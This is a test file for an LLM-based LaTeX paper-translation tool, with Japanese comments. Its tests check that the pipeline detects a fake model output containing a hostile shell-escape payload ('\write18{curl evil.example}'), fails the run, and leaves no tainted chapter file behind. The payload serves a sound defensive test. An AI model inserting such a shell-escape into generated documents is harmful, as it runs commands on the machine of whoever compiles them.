import { describe, it, expect, afterEach } from "vitest";
import { mkdtempSync, writeFileSync, readdirSync, existsSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { translatePaper } from "./translate-paper.js";
import { GlossaryDb } from "../terminology/db.js";
import { FakeLlmClient } from "../testing/fake-llm.js";
import { makeTar } from "../ingest/archive.fixtures.js";
import type { LatexRunner } from "../tools/build-gate.js";

const okRunner: LatexRunner = (dir) => {
  writeFileSync(path.join(dir, "main.pdf"), "%PDF");
  return { code: 0, log: "Output written on main.pdf (1 page)." };
};

const dirs: string[] = [];
const tmp = (): string => {
  const d = mkdtempSync(path.join(os.tmpdir(), "jpaper-taint-"));
  dirs.push(d);
  return d;
};
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

const PAYLOAD = "\\write18{curl evil.example}";

// seg-0000 には危険コマンドを注入し、seg-0001 は正常に訳す。
function taintClient(): FakeLlmClient {
  return new FakeLlmClient((req) => {
    if (req.system.includes("編纂者")) {
      return JSON.stringify({
        resolved: [],
        brief: { thesis: "核", sectionRoles: [], notationConventions: [] },
        style: { tensePolicy: "a", headingStyle: "b", numberStyle: "c" },
      });
    }
    if (req.system.includes("審査者")) return '{"verdict":"pass","issues":[]}';
    const tainted = req.user.includes("Alpha");
    return JSON.stringify({
      segmentId: "x",
      ja: tainted ? `はじめに。${PAYLOAD}` : "本文の訳。",
    });
  });
}

function paperTar(): string {
  const p = path.join(tmp(), "p.tar");
  writeFileSync(
    p,
    makeTar([
      {
        name: "main.tex",
        content:
          "\\documentclass{a}\\begin{document}\\section{Intro}Alpha text.\\section{Body}Beta text.\\end{document}",
      },
    ]),
  );
  return p;
}

describe("汚染の観測可能性", () => {
  it("汚染で落ちた run は品質の失敗と区別できる", async () => {
    const warnings: string[] = [];
    const r = await translatePaper(
      { kind: "path", path: paperTar() },
      { provider: "ollama", outDir: tmp() },
      {
        latexRunner: okRunner,
        client: taintClient(),
        db: new GlossaryDb(":memory:"),
        cacheKey: Buffer.alloc(32, 5),
        onError: (m) => warnings.push(m),
      },
    );
    expect(r.status).toBe("failed");
    expect(r.exitCode).toBe(3);
    expect(r.error?.message).toContain("汚染の疑い");
    expect(warnings.some((w) => w.includes("汚染の疑い"))).toBe(true);
  });

  it("落ちたセグメントの訳文を成果物ディレクトリに残さない", async () => {
    // 失敗した run でも chapters/seg-0000.tex に \write18{...} が書き出されていた。
    // run は exit 3 で失敗するが、利用者が手で組版すれば発火する。
    const out = tmp();
    await translatePaper(
      { kind: "path", path: paperTar() },
      { provider: "ollama", outDir: out },
      {
        latexRunner: okRunner,
        client: taintClient(),
        db: new GlossaryDb(":memory:"),
        cacheKey: Buffer.alloc(32, 6),
      },
    );
    const chapters = path.join(out, "translation", "chapters");
    const files = existsSync(chapters) ? readdirSync(chapters) : [];
    expect(files).not.toContain("seg-0000.tex");
  });
});
